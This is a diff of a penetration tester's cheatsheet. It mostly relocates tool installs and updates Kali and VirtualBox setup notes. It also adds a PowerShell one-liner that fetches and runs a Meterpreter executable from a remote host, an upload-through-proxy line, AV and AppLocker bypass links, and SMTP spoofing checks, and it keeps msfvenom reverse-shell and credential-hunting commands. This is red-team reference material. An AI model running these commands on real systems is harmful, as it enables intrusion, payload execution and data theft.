@@ -397,7 +397,7 @@ root@kali:$ enum4linux -v -a 127.0.0.1 | tee enum4linux.txt
 #### nullinux.py
 
 ```
-root@kali:$ git clone https://github.com/m8r0wn/nullinux /opt/nullinux && cd /opt/nullinux && sudo bash setup.sh && ln -s /opt/nullinux/nullinux.py /usr/local/bin/nullinux.py && cd -
+root@kali:$ git clone https://github.com/m8r0wn/nullinux ~/tools/nullinux && cd ~/tools/nullinux && sudo bash setup.sh && ln -s ~/tools/nullinux/nullinux.py /usr/local/bin/nullinux.py && cd -
 root@kali:$ nullinux.py 127.0.0.1
 ```
 
@@ -587,7 +587,7 @@ PS> Invoke-Bloodhound -CollectionMethod All -Domain EXAMPLE.LOCAL -LDAPUser snov
 Collect graphs via `bloodHound.py` **[1]** (with BloodHound running):
 
 ```
-root@kali:$ git clone https://github.com/fox-it/BloodHound.py /opt/BloodHound.py && cd /opt/BloodHound.py && python setup.py install && cd -
+root@kali:$ git clone https://github.com/fox-it/BloodHound.py ~/tools/BloodHound.py && cd ~/tools/BloodHound.py && python setup.py install && cd -
 root@kali:$ bloodhound-python -c All -u snovvcrash -p qwe123 -d EXAMPLE.LOCAL -ns 127.0.0.1
 ```
 
@@ -700,7 +700,17 @@ PS> cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 
 
 
+## AppLocker Bypass
+
+* [github.com/api0cradle/UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)
+
+
+
+
 ## AV Bypass
+
+* [hacker.house/lab/windows-defender-bypassing-for-meterpreter/](https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/)
+* [codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/](https://codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/)
 
 
 
@@ -729,8 +739,8 @@ root@kali:$ wine PEScrambler.exe -i input.exe -o output.exe
 Install and generate a payload:
 
 ```
-root@kali:$ git clone https://github.com/GreatSCT/GreatSCT /opt/GreatSCT
-root@kali:$ cd /opt/GreatSCT/setup
+root@kali:$ git clone https://github.com/GreatSCT/GreatSCT ~/tools/GreatSCT
+root@kali:$ cd ~/tools/GreatSCT/setup
 root@kali:$ ./setup.sh
 root@kali:$ cd .. && ./GreatSCT.py
 ...generate a payload...
@@ -753,7 +763,7 @@ PS> cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
 ### Ebowla
 
 ```
-root@kali:$ sudo git clone https://github.com/Genetic-Malware/Ebowla /opt/Ebowla && cd /opt/Ebowla
+root@kali:$ sudo git clone https://github.com/Genetic-Malware/Ebowla ~/tools/Ebowla && cd ~/tools/Ebowla
 root@kali:$ sudo apt install golang wine -y
 root@kali:$ sudo python -m pip install configobj pyparsing pycrypto pyinstaller
 root@kali:$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
@@ -900,9 +910,9 @@ SELECT username,password FROM secret_database;
 Install **[1]** or **[2]**:
 
 ```
-root@kali:$ mkdir /opt/redis-cli-go && cd /opt/redis-cli-go
+root@kali:$ mkdir ~/tools/redis-cli-go && cd ~/tools/redis-cli-go
 root@kali:$ wget [1] -O redis-cli-go && chmod +x redis-cli-go
-root@kali:$ ln -s /opt/redis-cli-go/redis-cli-go /usr/local/bin/redis-cli-go && cd -
+root@kali:$ ln -s ~/tools/redis-cli-go/redis-cli-go /usr/local/bin/redis-cli-go && cd -
 ```
 
 1. [github.com/holys/redis-cli/releases](https://github.com/holys/redis-cli/releases)
@@ -1281,6 +1291,46 @@ root@kali:$ nslookup
 
 
 
+### SMTP
+
+Check if sender could be forged with an existent domain user:
+
+```
+telnet mail.example.com
+HELO example.com
+MAIL FROM: exists@exmaple.com
+RCPT TO: admin@example.com
+```
+
+Check if sender could be forged with a non-nonexistent non-domain user:
+
+```
+telnet mail.example.com
+HELO example.com
+MAIL FROM: doesnotexist@nowhere.local
+RCPT TO: admin@example.com
+```
+
+Check if domain users could be enumerated with `VRFY` and `EXPN`:
+
+```
+telnet mail.example.com
+HELO example.com
+VRFY: exists@exmaple.com
+EXPN: exists@exmaple.com
+```
+
+Check for Sender Address Verification and hiding non-existent recipient is enabled:
+
+```
+telnet mail.example.com
+HELO example.com
+MAIL FROM: exists@exmaple.com
+RCPT TO: exists@exmaple.com
+```
+
+
+
 
 ## Pivoting
 
@@ -1381,16 +1431,16 @@ PS> Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\Powershell
 `winPEAS.bat` (winPEAS):
 
 ```
-root@kali:$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite /opt/privilege-escalation-awesome-scripts-suite
-root@kali:$ cp /opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe . && python3 -m http.server 80
+root@kali:$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite ~/tools/privilege-escalation-awesome-scripts-suite
+root@kali:$ cp ~/tools/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe . && python3 -m http.server 80
 PS> (new-object net.webclient).downloadfile('http://127.0.0.1/winPEAS.exe', 'C:\Users\snovvcrash\music\winPEAS.exe')
 ```
 
 `PowerUp.ps1` (PowerSploit):
 
 ```
-root@kali:$ git clone https://github.com/PowerShellMafia/PowerSploit/ -b dev /opt/PowerSploit
-root@kali:$ cp /opt/PowerSploit/Privesc/PowerUp.ps1 . && python3 -m http.server 80
+root@kali:$ git clone https://github.com/PowerShellMafia/PowerSploit/ -b dev ~/tools/PowerSploit
+root@kali:$ cp ~/tools/PowerSploit/Privesc/PowerUp.ps1 . && python3 -m http.server 80
 PS> powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/PowerUp.ps1')"
 PS> Invoke-AllChecks |Out-File powerup.txt
 ```
@@ -1425,9 +1475,9 @@ PS> runas /netonly /user:snovvcrash powershell
 Install:
 
 ```
-root@kali:$ git clone https://github.com/Hackplayers/evil-winrm /opt/evil-winrm
-root@kali:$ cd /opt/evil-winrm && bundle install && cd -
-root@kali:$ ln -s /opt/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
+root@kali:$ git clone https://github.com/Hackplayers/evil-winrm ~/tools/evil-winrm
+root@kali:$ cd ~/tools/evil-winrm && bundle install && cd -
+root@kali:$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
 ```
 
 Run:
@@ -1843,8 +1893,8 @@ root@kali:$ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1
 `parsenmap.rb`:
 
 ```
-root@kali:$ git clone https://github.com/R3dy/parsenmap /opt/parsenmap && cd /opt/parsenmap
-root@kali:$ bundle install && ln -s /opt/parsenmap/parsenmap.rb /usr/local/bin/parsenmap.rb && cd -
+root@kali:$ git clone https://github.com/R3dy/parsenmap-rb ~/tools/parsenmap-rb && cd ~/tools/parsenmap-rb
+root@kali:$ bundle install && ln -s ~/tools/parsenmap-rb/parsenmap.rb /usr/local/bin/parsenmap.rb && cd -
 root@kali:$ parsenmap.rb --help
 ```
 
@@ -1853,8 +1903,8 @@ root@kali:$ parsenmap.rb --help
 `nmaptocsv`:
 
 ```
-root@kali:$ git clone https://github.com/maaaaz/nmaptocsv /opt/nmaptocsv && cd /opt/nmaptocsv
-root@kali:$ python3 -m pip install -r requirements.txt csvkit && ln -s /opt/nmaptocsv/nmaptocsv.py /usr/local/bin/nmaptocsv.py && cd -
+root@kali:$ git clone https://github.com/maaaaz/nmaptocsv ~/tools/nmaptocsv && cd ~/tools/nmaptocsv
+root@kali:$ python3 -m pip install -r requirements.txt csvkit && ln -s ~/tools/nmaptocsv/nmaptocsv.py /usr/local/bin/nmaptocsv.py && cd -
 root@kali:$ nmaptocsv.py --help
 ```
 
@@ -1863,11 +1913,11 @@ root@kali:$ nmaptocsv.py --help
 `parsenmap.py`:
 
 ```
-root@kali:$ wget https://github.com/snovvcrash/cheatsheets/raw/master/scripts/parsenmap.py -O /opt/Scripts/parsenmap.py && chmod +x /opt/Scripts/parsenmap.py
-root@kali:$ ln -s /opt/Engagement/parsenmap.py /usr/local/bin/parsenmap.py
+root@kali:$ wget https://github.com/snovvcrash/cheatsheets/raw/master/tools/parsenmap.py -O ~/tools/parsenmap-py/parsenmap.py && chmod +x ~/tools/parsenmap-py/parsenmap.py
+root@kali:$ ln -s ~/tools/parsenmap-py/parsenmap.py /usr/local/bin/parsenmap.py
 ```
 
-* [github.com/snovvcrash/cheatsheets/blob/master/scripts/parsenmap.py](https://github.com/snovvcrash/cheatsheets/blob/master/scripts/parsenmap.py)
+* [github.com/snovvcrash/cheatsheets/blob/master/tools/parsenmap.py](https://github.com/snovvcrash/cheatsheets/blob/master/tools/parsenmap.py)
 
 
 
@@ -2108,17 +2158,18 @@ root@kali:$ cp t passwords.txt
 		$ dig example.com ns
 		$ dig axfr @ns.example.com example.com
 		$ ./axfr-test.py -d example.com
+	+ Subdomains
+		$ ./amass enum -d zonetransfer.me -v -ip -src [-active] [-brute]
+		$ ./subbrute.py example.com
+		$ ./knockpy example.com
+		$ ./dnsrecon.py -d example.com
 	+ AS details
 		$ whois -h whois.cymru.com -- '-v 127.0.0.1'
 		$ whois -h whois.cymru.com -- '-v AS48666'
 	$ whois example.com
 	$ whois 127.0.0.1
-	+ Subdomains
-		$ ./amass -d example.com
-		$ ./subbrute.py example.com
-		$ ./knockpy example.com
-		$ ./dnsrecon.py -d example.com
 	+ Check for DNS Amplification
+		$ host facebook.com ns.example.com
 * CMS, Stack, Vulns
 	$ whatweb 127.0.0.1
 	+ Shodan/Censys/SecurityTrails
@@ -2160,16 +2211,18 @@ root@kali:$ crackmapexec smb 127.0.0.1 -u snovvcrash -p /usr/share/seclists/Pass
 root@kali:$ kerbrute bruteuser -d EXAMPLE.LOCAL --dc 127.0.0.1 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt snovvcrash -t 50
 root@kali:$ evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s ./ -e ./
 
-PS> .\winPEAS.bat
-PS> .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
-PS> powershell.exe -nop -exec bypass -c "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks |Out-File PowerUp.txt}"
-PS> powershell.exe -nop -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File Sherlock.txt}"
-
 PS> systeminfo
 PS> whoami /priv (whoami /all)
-PS> gci "$env:userprofile" -recurse | select fullname
+PS> gci "$env:userprofile" -recurse -af |select fullname
 PS> net user
+PS> net user /domain
+PS> net user j.doe /domain
+PS> net accounts
+PS> net accounts /domain
 PS> net localgroup Administrators
+PS> net group /domain
+PS> net group "Domain admins" /domain
+PS> net group "Enterprise admins" /domain
 PS> cmdkey /list
 PS> wmic product get name
 PS> get-process
@@ -2177,6 +2230,7 @@ PS> tasklist /SVC
 PS> net start
 PS> netstat -ano | findstr LIST
 PS> ipconfig /all
+PS> route print
 PS> dir -force c:\
 PS> echo [Environment]::Is64BitOperatingSystem
 PS> echo $ExecutionContext.SessionState.LanguageMode
@@ -2185,6 +2239,33 @@ PS> cmd /c dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* =
 PS> cmd /c where /R C:\ *.ini
 PS> REG QUERY HKLM /f "password" /t REG_SZ /s
 PS> REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AltDefaultUserName AltDefaultDomainName AltDefaultPassword LastUsedUsername"
+PS> reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | findstr /i proxy
+
+PS> .\winPEAS.bat
+PS> .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
+PS> powershell.exe -nop -exec bypass -c "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks |Out-File PowerUp.txt}"
+PS> powershell.exe -nop -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File Sherlock.txt}"
+```
+
+
+#### One-liners
+
+Powershell ping sweep:
+
+```
+echo "[*] Scanning in progress...";1..254 |ForEach-Object {Get-WmiObject Win32_PingStatus -Filter "Address='10.10.100.$_' and Timeout=50 and ResolveAddressNames='false' and StatusCode=0" |select ProtocolAddress* |Out-File -Append -FilePath .\live_hosts.txt};echo "[+] Live hosts:"; Get-Content -Path .\live_hosts.txt | ? { $_ -match "10.10.100" }; echo "[*] Done.";del .\live_hosts.txt
+```
+
+Powershell auto detect proxy, download file from remote HTTP server and run it:
+
+```
+$proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer;$proxy=New-Object System.Net.WebProxy;$proxy.Address=$proxyAddr;$proxy.useDefaultCredentials=$true;$client=New-Object System.Net.WebClient;$client.Proxy=$proxy;$client.DownloadFile("http://10.10.13.37/met.exe","$env:userprofile\music\met.exe");$exec=New-Object -com shell.application;$exec.shellexecute("$env:userprofile\music\met.exe")
+```
+
+Powershell manually set proxy and upload file to remote HTTP server:
+
+```
+$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.example.local:3128",$true);$creds=New-Object Net.NetworkCredential('snovvcrash','qwe123','example.local');$creds=$creds.GetCredential("http://proxy.example.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
 ```
 
 
@@ -2530,47 +2611,67 @@ $ gpg -o/--output decrypted.txt -d/--decrypt -u/--local-user user1@example.com -
 
 
 
+# VirtualBox
+
+
+
+
+## DHCP
+
+```
+Cmd> "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" dhcpserver add --netname intnet --ip 10.0.1.1 --netmask 255.255.255.0 --lowerip 10.0.1.101 --upperip 10.0.1.254 --enable
+```
+
+
+
+
+
 # Kali
 
 
 
 
-## Initial
+## Configure
 
 Mix settings list (both for hardware install and virtualization):
 
 ```
-* Allocate 4GB RAM
-* Set up shared folder (+ automount)
-* Disable screen lock (Power manager settings -> Display)
-* Set up root user (+ disable kali user) [NOT RECOMMENDED THOUGH :unamused:]
-	kali@kali:$ sudo -i
-	root@kali:$ passwd root
-	* Re-login as root
-	root@kali:$ usermod -L kali && usermod -s /sbin/nologin kali && chage -E0 kali
-* Or just increase sudo timestamp_timeout value
-	root@kali:$ sudo visudo
-		Defaults    env_reset,timestamp_timeout=45
-* Configure networks
-* Update && Upgrade
-* Install guest additions
-* cmake
-	root@kali:$ apt install cmake -y
-* zsh & oh-my-zh (https://git.io/M1y4bQ)
-	root@kali:$ apt install zsh -y && sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"
-	root@kali:$ git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting
-	root@kali:$ git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
-	root@kali:$ sed -i 's/plugins=(git)/plugins=(git zsh-syntax-highlighting zsh-autosuggestions)/g' ~/.zshrc
-	* Re-login
-* dotfiles
-	root@kali:$ git clone https://github.com/snovvcrash/dotfiles-linux ~/.dotfiles
-* tilix
-	root@kali:$ apt install tilix -y && mkdir -p ~/.config/tilix/schemes
-* tmux
-	root@kali:$ bash ~/.dotfiles/tmux/INSTALL.sh
-	root@kali:$ git clone https://github.com/thewtex/tmux-mem-cpu-load ~/.tmux/plugins/tmux-mem-cpu-load && cd ~/.tmux/plugins/tmux-mem-cpu-load && cmake . && make && sudo make install
-* Other
-	root@kali:$ apt install keepassx timeshift -y
+[VM] Disable screen lock (Power manager settings -> Display -> Display power manager -> OFF)
+[VM] Configure networks (+ remember to configure VBox DHCP first)
+[All] Update && Upgrade (+ change /etc/apt/sources.list to HTTPS if getting "403 Forbidden" because of the antivirus)
+	$ sudo apt update && sudo upgrade -y
+	$ sudo reboot
+[VM] Install guest additions
+	* Insert Guest Additions CD image and open terminal there
+	$ cp /media/cdrom0/VBoxLinuxAdditions.run ~/Desktop && chmod 755 ~/Desktop/VBoxLinuxAdditions.run && sudo ~/Desktop/VBoxLinuxAdditions.run
+	$ sudo reboot
+	$ rm ~/Desktop/VBoxLinuxAdditions.run && sudo eject
+[ALL] Manage users
+	* Enable root or create new user
+		SWITCH {
+			CASE (root):
+				$ sudo -i
+				$ passwd root
+				* Re-login as root
+			CASE (non-root):
+				$ sudo useradd -u 1337 snovvcrash
+				* Re-login as snovvcrash
+		}
+	* Disable kali user [VM]
+		SWITCH {
+			CASE (lock):
+				$ sudo usermod -L kali && usermod -s /sbin/nologin kali && chage -E0 kali
+			CASE (delete):
+				$ sudo userdel -r kali
+		}
+[ALL] Increase sudo password timeout value
+	$ sudo visudo
+		"Defaults    env_reset,timestamp_timeout=45"
+[ALL] Install cmake
+	$ sudo apt install cmake -y
+[ALL] Pull dotfiles
+	$ git clone https://github.com/snovvcrash/dotfiles-linux ~/.dotfiles
+[ALL] Run ~/.dotfiles/00-autodeploy scripts on the discretion
 ```
 
 
@@ -2582,24 +2683,47 @@ Mix settings list (both for hardware install and virtualization):
 
 ### Guest Additions
 
+Known issues:
+
+* [forums.virtualbox.org/viewtopic.php?f=3&t=96087](https://forums.virtualbox.org/viewtopic.php?f=3&t=96087)
+* [www.ceos3c.com/hacking/kali-linux-2020-1-virtualbox-shared-clipboard-stopped-working-fixed/](https://www.ceos3c.com/hacking/kali-linux-2020-1-virtualbox-shared-clipboard-stopped-working-fixed/)
+
+
+
+### Network
+
+Configure multiple interfaces to work simultaneously:
+
 ```
-root@kali:$ apt update & apt dist-upgrade -y
-root@kali:$ reboot
-root@kali:$ apt install virtualbox-guest-x11 -y
-root@kali:$ reboot
-Or
-* Mount the VirtualBox Guest Additions drive
-root@kali:$ cp /media/cdrom0/VBoxLinuxAdditions.run /root/Desktop/
-root@kali:$ chmod 755 ~/Desktop/VBoxLinuxAdditions.run
-root@kali:$ ~/Desktop/VBoxLinuxAdditions.run
-root@kali:$ reboot
-root@kali:$ rm ~/Desktop/VBoxLinuxAdditions.run
-root@kali:$ eject
+root@kali:$ sudo vi /etc/network/interfaces
+...
+# NAT
+allow-hotplug eth0
+iface eth0 inet dhcp
+
+# Internal
+allow-hotplug eth1
+iface eth1 inet dhcp
+
+# Host-only
+allow-hotplug eth2
+iface eth2 inet dhcp
+...
+
+root@kali:$ sudo ifup eth0
+root@kali:$ sudo ifup eth1
+root@kali:$ sudo ifup eth2
 ```
 
+* [unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on](https://unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on)
+* [kali.training/topic/configuring-the-network/](https://kali.training/topic/configuring-the-network/)
+* [www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/](https://www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/)
+* [www.virtualbox.org/manual/ch06.html](https://www.virtualbox.org/manual/ch06.html)
+* [forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time](https://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time)
 
 
-### Share Folder
+
+### Share Folder (old)
 
 Mount:
 
@@ -2618,39 +2742,6 @@ Automount:
 root@kali:$ crontab -e
 "@reboot    sleep 10; mount -t vboxsf /mnt/share-host ~/Desktop/Share"
 ```
-
-
-
-### Network
-
-Configure multiple interfaces to work simultaneously:
-
-```
-root@kali:$ cat /etc/network/interfaces
-...
-# NAT
-allow-hotplug eth0
-iface eth0 inet dhcp
-
-# Internal
-allow-hotplug eth1
-iface eth1 inet dhcp
-
-# Host-only
-allow-hotplug eth2
-iface eth1 inet dhcp
-...
-
-root@kali:$ ifup eth0
-root@kali:$ ifup eth1
-root@kali:$ ifup eth2
-```
-
-* [unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on](https://unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on)
-* [kali.training/topic/configuring-the-network/](https://kali.training/topic/configuring-the-network/)
-* [www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/](https://www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/)
-* [www.virtualbox.org/manual/ch06.html](https://www.virtualbox.org/manual/ch06.html)
-* [forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time](https://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time)
 
 
 
@@ -3275,21 +3366,6 @@ secpol.msc  -- "Local Security Policy" -- "Локальная политика �
 gpedit.msc  -- "Local Group Policy Editor" -- "Редактор локальной групповой политики"
 lusrmgr.msc -- "Local Users and Groups (Local)" -- "Локальные пользователи и группы (локально)"
 certmgr.msc -- "Certificates - Current User" -- "Сертификаты - текущий пользователь"
-```
-
-
-
-
-
-# VirtualBox
-
-
-
-
-## DHCP
-
-```
-Cmd> VBoxManage.exe dhcpserver add --netname intnet --ip 10.0.1.1 --netmask 255.255.255.0 --lowerip 10.0.1.101 --upperip 10.0.1.254 --enable
 ```
 
 
